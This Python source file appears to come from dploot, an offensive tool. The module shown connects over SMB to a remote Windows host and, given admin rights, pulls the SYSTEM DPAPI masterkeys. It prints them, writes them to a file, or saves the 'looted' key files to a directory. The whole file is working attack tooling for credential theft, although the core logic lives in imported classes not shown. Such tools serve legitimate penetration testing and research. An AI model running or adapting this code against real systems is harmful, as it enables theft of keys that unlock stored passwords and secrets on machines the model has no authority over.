import argparse
import logging
import os
from typing import Callable, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option
from dploot.triage.masterkeys import MasterkeysTriage


NAME = 'machinemasterkeys'

class MachineMasterkeysAction:

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.outputfile = None
        self.append = self.options.append
        self.outputdir = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_mk)

        if self.options.outputfile is not None and self.options.outputfile != '':
            self.outputfile = self.options.outputfile

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        self.conn.connect()
    
    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        if self.is_admin:
            triage = MasterkeysTriage(target=self.target, conn=self.conn)
            logging.info("Triage SYSTEM masterkeys\n")
            masterkeys = triage.triage_system_masterkeys()
            if self.outputfile is not None:
                with open(self.outputfile + '.mkf', ('a+' if self.append else 'w')) as file:
                    for masterkey in masterkeys:
                        masterkey.dump()
                        file.write(str(masterkey)+'\n')
                        logging.critical("Writting masterkeys to %s" % self.outputfile)
            else:
                for masterkey in masterkeys:
                    masterkey.dump()
            if self.outputdir is not None:
                for filename, bytes in triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)
            
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = MachineMasterkeysAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Dump system masterkey from remote target")

    group = subparser.add_argument_group("machinemasterkeys options")

    group.add_argument(
        "-outputfile",
        action="store",
        help=(
            "Export keys to file"
        ),
    )

    group.add_argument(
        "-append",
        action="store_true",
        help=(
            "Appends keys to file specified with -outputfile"
        ),
    )

    group.add_argument(
        "-export-mk",
        action="store",
        metavar="DIR_MASTERKEYS",
        help=(
            "Dump looted masterkey files to specified directory, regardless they were decrypted"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry